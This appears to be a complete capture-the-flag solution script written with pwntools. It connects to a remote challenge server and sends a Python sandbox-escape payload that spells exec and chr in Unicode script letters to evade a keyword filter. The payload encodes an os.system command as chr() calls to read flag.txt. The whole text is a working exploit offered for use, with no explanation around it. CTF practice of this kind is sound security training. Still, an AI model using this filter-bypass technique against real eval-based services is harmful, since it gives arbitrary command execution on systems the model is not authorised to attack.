from pwn import *

context.log_level = 'debug'
host, port = 'challenge.ctf.games', 30988
io = remote(host, port)

cmd = 'import os; os.system("cat flag.txt")'
payload = '' 

payload += '𝓮𝔁𝓮𝓬('
for i in range(len(cmd)):
    payload += f'𝓬𝓱𝓻({ord(cmd[i])})'
    if i == len(cmd) - 1:
        break
    payload += ' + '
payload += ')'

io.sendlineafter(b'expression:', payload)
io.interactive()